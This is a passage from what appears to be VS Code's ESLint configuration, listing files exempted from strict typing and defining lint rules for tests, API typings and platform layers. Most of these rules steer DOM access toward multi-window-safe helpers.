			'src/vs/workbench/contrib/authentication/browser/actions/manageTrustedMcpServersForAccountAction.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/bulkTextEdits.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPane.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPreview.ts',
			'src/vs/workbench/contrib/codeEditor/browser/inspectEditorTokens/inspectEditorTokens.ts',
			'src/vs/workbench/contrib/codeEditor/browser/outline/documentSymbolsOutline.ts',
			'src/vs/workbench/contrib/codeEditor/electron-browser/selectionClipboard.ts',
			'src/vs/workbench/contrib/commands/common/commands.contribution.ts',
			'src/vs/workbench/contrib/comments/browser/commentsTreeViewer.ts',
			'src/vs/workbench/contrib/comments/browser/commentsView.ts',
			'src/vs/workbench/contrib/comments/browser/reactionsAction.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditorInputFactory.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditors.ts',
			'src/vs/workbench/contrib/customEditor/common/customEditor.ts',
			'src/vs/workbench/contrib/debug/browser/debugActionViewItems.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugCommands.ts',
			'src/vs/workbench/contrib/debug/browser/debugConfigurationManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorActions.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorContribution.ts',
			'src/vs/workbench/contrib/debug/browser/debugHover.ts',
			'src/vs/workbench/contrib/debug/browser/debugService.ts',
			'src/vs/workbench/contrib/debug/browser/debugSession.ts',
			'src/vs/workbench/contrib/debug/browser/rawDebugSession.ts',
			'src/vs/workbench/contrib/debug/browser/repl.ts',
			'src/vs/workbench/contrib/debug/browser/replViewer.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/abstractDebugAdapter.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replModel.ts',
			'src/vs/workbench/contrib/debug/test/common/mockDebug.ts',
			'src/vs/workbench/contrib/editSessions/common/workspaceStateSync.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/utils.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/telemetry/arcTelemetrySender.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionEditor.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionRecommendationNotificationService.ts',
			'src/vs/workbench/contrib/extensions/browser/extensions.contribution.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActions.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActivationProgress.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViewer.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViews.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsWorkbenchService.ts',
			'src/vs/workbench/contrib/extensions/common/extensions.ts',
			'src/vs/workbench/contrib/extensions/electron-browser/runtimeExtensionsEditor.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatActions.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatController.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatStrategies.ts',
			'src/vs/workbench/contrib/markdown/browser/markdownDocumentRenderer.ts',
			'src/vs/workbench/contrib/markers/browser/markers.contribution.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/commands/commands.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/utils.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/editorGutter.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/mergeEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/clipboard/notebookClipboard.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/find/notebookFind.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/layout/layoutActions.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/profile/notebookProfile.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/troubleshoot/layout.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/cellChatActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/editActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/notebookIndentationActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/sectionActions.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/diffComponents.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/inlineDiff/notebookDeletedCellDecorator.ts',
			'src/vs/workbench/contrib/notebook/browser/notebookBrowser.ts',
			'src/vs/workbench/contrib/notebook/browser/outputEditor/notebookOutputEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/services/notebookEditorServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/browser/view/notebookCellList.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewMessages.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts',
			'src/vs/workbench/contrib/notebook/browser/viewModel/markupCellViewModel.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookEditorStickyScroll.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookHorizontalTracker.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelQuickPickStrategy.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookCellTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookMetadataTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/notebookCommon.ts',
			'src/vs/workbench/contrib/notebook/common/notebookEditorModelResolverServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/test/browser/testNotebookEditor.ts',
			'src/vs/workbench/contrib/performance/electron-browser/startupProfiler.ts',
			'src/vs/workbench/contrib/preferences/browser/preferences.contribution.ts',
			'src/vs/workbench/contrib/preferences/browser/preferencesRenderers.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsEditor2.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTreeModels.ts',
			'src/vs/workbench/contrib/remote/browser/tunnelView.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/searchNotebookHelpers.ts',
			'src/vs/workbench/contrib/search/browser/replace.ts',
			'src/vs/workbench/contrib/search/browser/replaceService.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsCopy.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsBase.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsFind.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsNav.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsRemoveReplace.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTextQuickAccess.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTopBar.ts',
			'src/vs/workbench/contrib/search/browser/searchMessage.ts',
			'src/vs/workbench/contrib/search/browser/searchResultsView.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/fileMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/folderMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchModel.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchResult.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchTreeCommon.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/textSearchHeading.ts',
			'src/vs/workbench/contrib/search/browser/searchView.ts',
			'src/vs/workbench/contrib/search/test/browser/mockSearchTree.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditor.contribution.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorActions.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorInput.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/configureSnippets.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/insertSnippet.ts',
			'src/vs/workbench/contrib/snippets/browser/snippetsService.ts',
			'src/vs/workbench/contrib/testing/common/storedValue.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/typeHierarchy/browser/typeHierarchy.contribution.ts',
			'src/vs/workbench/contrib/typeHierarchy/common/typeHierarchy.ts',
			'src/vs/workbench/contrib/webview/browser/overlayWebview.ts',
			'src/vs/workbench/contrib/webview/browser/webview.ts',
			'src/vs/workbench/contrib/webview/browser/webviewElement.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditor.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditorInputSerializer.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewWorkbenchService.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStartedService.ts',
			'src/vs/workbench/contrib/welcomeWalkthrough/browser/walkThroughPart.ts',
			'src/vs/workbench/services/authentication/common/authentication.ts',
			'src/vs/workbench/services/authentication/test/browser/authenticationQueryServiceMocks.ts',
			'src/vs/workbench/services/commands/common/commandService.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolver.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolverExpression.ts',
			'src/vs/workbench/services/extensions/common/extensionHostManager.ts',
			'src/vs/workbench/services/extensions/common/extensionsRegistry.ts',
			'src/vs/workbench/services/extensions/common/lazyPromise.ts',
			'src/vs/workbench/services/extensions/common/polyfillNestedWorker.protocol.ts',
			'src/vs/workbench/services/extensions/common/rpcProtocol.ts',
			'src/vs/workbench/services/extensions/worker/polyfillNestedWorker.ts',
			'src/vs/workbench/services/keybinding/browser/keybindingService.ts',
			'src/vs/workbench/services/keybinding/browser/keyboardLayoutService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingEditing.ts',
			'src/vs/workbench/services/keybinding/common/keymapInfo.ts',
			'src/vs/workbench/services/language/common/languageService.ts',
			'src/vs/workbench/services/outline/browser/outline.ts',
			'src/vs/workbench/services/outline/browser/outlineService.ts',
			'src/vs/workbench/services/preferences/common/preferences.ts',
			'src/vs/workbench/services/preferences/common/preferencesModels.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/replace.ts',
			'src/vs/workbench/services/search/common/search.ts',
			'src/vs/workbench/services/search/common/searchExtConversionTypes.ts',
			'src/vs/workbench/services/search/common/searchExtTypes.ts',
			'src/vs/workbench/services/search/node/fileSearch.ts',
			'src/vs/workbench/services/search/node/rawSearchService.ts',
			'src/vs/workbench/services/search/node/ripgrepTextSearchEngine.ts',
			'src/vs/workbench/services/textMate/common/TMGrammarFactory.ts',
			'src/vs/workbench/services/themes/browser/fileIconThemeData.ts',
			'src/vs/workbench/services/themes/browser/productIconThemeData.ts',
			'src/vs/workbench/services/themes/common/colorThemeData.ts',
			'src/vs/workbench/services/themes/common/plistParser.ts',
			'src/vs/workbench/services/themes/common/themeExtensionPoints.ts',
			'src/vs/workbench/services/themes/common/workbenchThemeService.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/workbench/test/common/workbenchTestServices.ts',
			'src/vs/workbench/test/electron-browser/workbenchTestServices.ts',
			// Server
			'src/vs/server/node/remoteAgentEnvironmentImpl.ts',
			'src/vs/server/node/remoteExtensionHostAgentServer.ts',
			'src/vs/server/node/remoteExtensionsScanner.ts',
			// Tests
			'**/*.test.ts',
			'**/*.integrationTest.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': false
				}
			]
		}
	},
	// Tests
	{
		files: [
			'**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-must-use-super-dispose': 'off',
			'local/code-no-test-only': 'error',
			'local/code-no-test-async-suite': 'warn',
			'local/code-must-use-result': [
				'warn',
				[
					{
						'message': 'Expression must be awaited',
						'functions': [
							'assertSnapshot',
							'assertHeap'
						]
					}
				]
			]
		}
	},
	// vscode tests specific rules
	{
		files: [
			'src/vs/**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-ensure-no-disposables-leak-in-test': [
				'warn',
				{
					// Files should (only) be removed from the list they adopt the leak detector
					'exclude': [
						'src/vs/workbench/services/userActivity/test/browser/domActivityTracker.test.ts',
					]
				}
			]
		}
	},
	// git extension - ban non-type imports from git.d.ts (use git.constants for runtime values)
	{
		files: [
			'extensions/git/src/**/*.ts',
		],
		ignores: [
			'extensions/git/src/api/git.constants.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-imports': 'off',
			'@typescript-eslint/no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['*/api/git'],
							'allowTypeImports': true,
							'message': 'Use \'import type\' for types from git.d.ts and import runtime const enum values from git.constants instead'
						},
					]
				}
			]
		}
	},
	// vscode API
	{
		files: [
			'**/vscode.d.ts',
			'**/vscode.proposed.*.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `TSArrayType > TSUnionType`,
					'message': 'Use Array<...> for arrays of union types.'
				},
			],
			'local/vscode-dts-create-func': 'warn',
			'local/vscode-dts-literal-or-types': 'warn',
			'local/vscode-dts-string-type-literals': 'warn',
			'local/vscode-dts-interface-naming': 'warn',
			'local/vscode-dts-cancellation': 'warn',
			'local/vscode-dts-use-export': 'warn',
			'local/vscode-dts-use-thenable': 'warn',
			'local/vscode-dts-vscode-in-comments': 'warn',
			'local/vscode-dts-provider-naming': [
				'warn',
				{
					'allowed': [
						'FileSystemProvider',
						'TreeDataProvider',
						'TestProvider',
						'CustomEditorProvider',
						'CustomReadonlyEditorProvider',
						'TerminalLinkProvider',
						'AuthenticationProvider',
						'NotebookContentProvider'
					]
				}
			],
			'local/vscode-dts-event-naming': [
				'warn',
				{
					'allowed': [
						'onCancellationRequested',
						'event'
					],
					'verbs': [
						'accept',
						'archive',
						'change',
						'close',
						'collapse',
						'create',
						'delete',
						'lock',
						'resume',
						'shutdown',
						'suspend',
						'unlock',
						'discover',
						'dispose',
						'drop',
						'edit',
						'end',
						'execute',
						'expand',
						'grant',
						'hide',
						'invalidate',
						'open',
						'override',
						'perform',
						'receive',
						'register',
						'remove',
						'rename',
						'reveal',
						'save',
						'send',
						'start',
						'terminate',
						'trigger',
						'unregister',
						'write',
						'commit'
					]
				}
			]
		}
	},
	// vscode.d.ts
	{
		files: [
			'**/vscode.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'jsdoc/tag-lines': 'off',
			'jsdoc/valid-types': 'off',
			'jsdoc/no-multi-asterisks': [
				'warn',
				{
					'allowWhitespace': true
				}
			],
			'jsdoc/require-jsdoc': [
				'warn',
				{
					'enableFixer': false,
					'contexts': [
						'TSInterfaceDeclaration',
						'TSPropertySignature',
						'TSMethodSignature',
						'TSDeclareFunction',
						'ClassDeclaration',
						'MethodDefinition',
						'PropertyDeclaration',
						'TSEnumDeclaration',
						'TSEnumMember',
						'ExportNamedDeclaration'
					]
				}
			],
			'jsdoc/check-param-names': [
				'warn',
				{
					'enableFixer': false,
					'checkDestructured': false
				}
			],
			'jsdoc/require-returns': 'warn'
		}
	},
	// common/browser layer
	{
		files: [
			'src/**/{common,browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-amd-node-module': 'warn'
		}
	},
	// node/electron layer
	{
		files: [
			'src/*.ts',
			'src/**/{node,electron-main,electron-utility}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				// Below are globals that are unsupported in ESM
				'__dirname',
				'__filename',
				'require'
			]
		}
	},
	// electron-main layer: prevent static imports of heavy node_modules
	// that would be synchronously loaded on startup
	{
		files: [
			'src/vs/code/electron-main/**/*.ts',
			'src/vs/code/node/**/*.ts',
			'src/vs/platform/*/electron-main/**/*.ts',
			'src/vs/platform/*/node/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-static-node-module-import': [
				'error',
				// Files that run in separate processes, not on the electron-main startup path
				'src/vs/platform/agentHost/node/**/*.ts',
				'src/vs/platform/files/node/watcher/**/*.ts',
				'src/vs/platform/terminal/node/**/*.ts',
				// Files that use small, safe modules
				'src/vs/platform/environment/node/argv.ts',
			]
		}
	},
	// browser/electron-browser layer
	{
		files: [
			'src/**/{browser,electron-browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-global-document-listener': 'warn',
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='MouseEvent']`,
					'message': 'Use DOM.isMouseEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^HTML\\w+/]`,
					'message': 'Use DOM.isHTMLElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^SVG\\w+/]`,
					'message': 'Use DOM.isSVGElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='KeyboardEvent']`,
					'message': 'Use DOM.isKeyboardEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='PointerEvent']`,
					'message': 'Use DOM.isPointerEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='DragEvent']`,
					'message': 'Use DOM.isDragEvent() to support multi-window scenarios.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='activeElement']`,
					'message': 'Use <targetWindow>.document.activeElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='contains']`,
					'message': 'Use <targetWindow>.document.contains to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='styleSheets']`,
					'message': 'Use <targetWindow>.document.styleSheets to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='fullscreenElement']`,
					'message': 'Use <targetWindow>.document.fullscreenElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='body']`,
					'message': 'Use <targetWindow>.document.body to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='addEventListener']`,
					'message': 'Use <targetWindow>.document.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='removeEventListener']`,
					'message': 'Use <targetWindow>.document.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='hasFocus']`,
					'message': 'Use <targetWindow>.document.hasFocus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='head']`,
					'message': 'Use <targetWindow>.document.head to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='exitFullscreen']`,
					'message': 'Use <targetWindow>.document.exitFullscreen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementById']`,
					'message': 'Use <targetWindow>.document.getElementById to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByClassName']`,
					'message': 'Use <targetWindow>.document.getElementsByClassName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByName']`,
					'message': 'Use <targetWindow>.document.getElementsByName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagName']`,
					'message': 'Use <targetWindow>.document.getElementsByTagName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagNameNS']`,
					'message': 'Use <targetWindow>.document.getElementsByTagNameNS to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getSelection']`,
					'message': 'Use <targetWindow>.document.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='open']`,
					'message': 'Use <targetWindow>.document.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='close']`,
					'message': 'Use <targetWindow>.document.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='documentElement']`,
					'message': 'Use <targetWindow>.document.documentElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='visibilityState']`,
					'message': 'Use <targetWindow>.document.visibilityState to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelector']`,
					'message': 'Use <targetWindow>.document.querySelector to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelectorAll']`,
					'message': 'Use <targetWindow>.document.querySelectorAll to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementFromPoint']`,
					'message': 'Use <targetWindow>.document.elementFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementsFromPoint']`,
					'message': 'Use <targetWindow>.document.elementsFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeydown']`,
					'message': 'Use <targetWindow>.document.onkeydown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeyup']`,
					'message': 'Use <targetWindow>.document.onkeyup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmousedown']`,
					'message': 'Use <targetWindow>.document.onmousedown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmouseup']`,
					'message': 'Use <targetWindow>.document.onmouseup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='execCommand']`,
					'message': 'Use <targetWindow>.document.execCommand to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelector\']',
					'message': 'querySelector should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelectorAll\']',
					'message': 'querySelectorAll should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementById\']',
					'message': 'getElementById should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByClassName\']',
					'message': 'getElementsByClassName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagName\']',
					'message': 'getElementsByTagName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByName\']',
					'message': 'getElementsByName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagNameNS\']',
					'message': 'getElementsByTagNameNS should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				}
			],
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				{
					'name': 'setInterval',
					'message': 'Use <targetWindow>.setInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'clearInterval',
					'message': 'Use <targetWindow>.clearInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestAnimationFrame',
					'message': 'Use <targetWindow>.requestAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelAnimationFrame',
					'message': 'Use <targetWindow>.cancelAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestIdleCallback',
					'message': 'Use <targetWindow>.requestIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelIdleCallback',
					'message': 'Use <targetWindow>.cancelIdleCallback to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'window',
					'message': 'Use <targetWindow> to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'addEventListener',
					'message': 'Use <targetWindow>.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'removeEventListener',
					'message': 'Use <targetWindow>.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'getComputedStyle',
					'message': 'Use <targetWindow>.getComputedStyle to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'focus',
